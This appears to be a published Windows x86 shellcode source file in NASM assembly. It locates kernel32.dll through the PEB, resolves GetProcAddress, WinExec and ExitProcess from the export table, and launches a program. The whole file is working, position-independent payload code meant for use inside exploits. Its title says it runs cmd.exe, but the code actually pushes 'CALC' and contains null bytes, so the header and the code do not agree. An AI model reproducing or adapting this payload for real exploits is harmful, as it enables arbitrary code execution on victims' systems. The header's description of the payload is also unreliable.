; /*
;    # Title : Windows x86 WinExec("cmd.exe",0) shellcode
;    # Date : 07/06/2016
;    # Author : Roziul Hasan Khan Shifat
;    # Tested On : Windows 7 Professional x86
; */
;  
; /*
; To Compile:
; --------------
;  
; $nasm -f win32 winexec.asm -o exec.obj
;  
;  
; Linking:
; ----------
; $ "C:\Program Files\CodeBlocks\MinGW\bin\ld.exe" -o winexec.exe exec.obj
;  
;  
; */
;  
; /*
 
section .text
    global _start
_start:
 
;Finding base address of kernel32.dll
 
xor ecx,ecx
mov eax,[fs:0x30] ;loading PEB(Process Environment Block) in Eax 
mov eax,[eax+0xc] ;Eax=PEB->Ldr
mov esi,[eax+0x14] ;Eax=Peb->Ldr.InMemOrderModuleList
lodsd ;Eax=second module of InMemOrderModuleList (ntdll.dll)
xchg eax,esi ;Eax=Esi ,Esi=Eax
lodsd ;Eax=third module of InMemOrderModuleList (kernel32.dll)
mov ebx,[eax+0x10] ;Ebx=base Address of Kernel32.dll (PVOID Dllbase)
 
;-------------------------------------------------------------------------------------------------------
 
 
 
;Finding Export table of Kernel32.dll
 
mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
add edx,ebx ;(DOS->e_lfanew+base address of kernel32.dll)=PE Header
mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
add edx,ebx ; (DataDirectory->VirtualAddress+kernel32.dll base address)=Export table of kernel32.dll (IMAGE_EXPORT_DIRECTORY)
mov esi,[edx+0x20] ;(IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
add esi,ebx ; ESI=(AddressOfNames+kernel32.dll base address)=kernel32.dll AddressOfNames
xor ecx,ecx
 
;--------------------------------------------------------------------------------------------------------------
 
 
;finding GetProcAddress function name
 
Get_func:
 
inc ecx ;Incrementing the Ordinal
lodsd ;Get name Offset
add eax,ebx ;(name offset+kernel32.dll base address)=Get Function name
cmp dword [eax],0x50746547 ;GetP
jnz Get_func
cmp dword [eax+0x4],0x41636f72 ; rocA
jnz Get_func
cmp dword [eax+0x8],0x65726464 ; ddre
jnz Get_func
 
;-----------------------------------------------------------------------------------------------------------
 
 
 
;finding the address of GetProcAddress
 
mov esi,[edx+0x24] ;Esi=(IMAGE_EXPORT_DIRECTORY+0x24)=AddressOfNameOrdinals
add esi,ebx ;(AddressOfNameOrdinals+base address of kernel32.dll)=AddressOfNameOrdinals of kernel32.dll
mov cx,[esi+ecx*2] ;CX=Number of Function
dec ecx
mov esi,[edx+0x1c] ;(IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions
add esi,ebx ;ESI=beginning of Address table
mov edx,[esi+ecx*4] ;EDX=Pointer(offset)
add edx,ebx ;Edx=Address of GetProcAddress
 
;-------------------------------------------------------------------------------------------------------
 
;backing up address of GetProcAddress because EAX,EBX,EDX,ECX Register value will be changed after calling function
xor esi,esi
push edx
pop esi
 
;----------------------------------------
 
;backing up kernel32.dll base address
xor edi,edi
push ebx
pop edi
 
;------------------------
;Finding address of Winexe()
xor ecx,ecx
push ecx
push 0x00636578
push 0x456e6957
 
mov ecx,esp
 
push ecx
push ebx
 
call edx
;-----------------------
;finding address of ExitProcess
xor ecx,ecx
push ecx
push 0x00737365
push 0x636f7250
push 0x74697845
 
mov ecx,esp
 
push ecx
push edi
 
xor edi,edi
mov edi,eax ;address of WinExec
 
call esi
 
;---------------
 
xor esi,esi
push eax
pop esi ;address of ExitProcess
;-------------------
;calling winexec
xor ecx,ecx
push ecx

;  push cmd.exe
;
;push 0x00657865
;push 0x2e646d63

; push calc
push  0x00000000
push  0x434c4143
 
mov ecx,esp
 
push 0
push ecx
 
call edi
 
;--------------
;exiting
push 0
call esi
 
; */
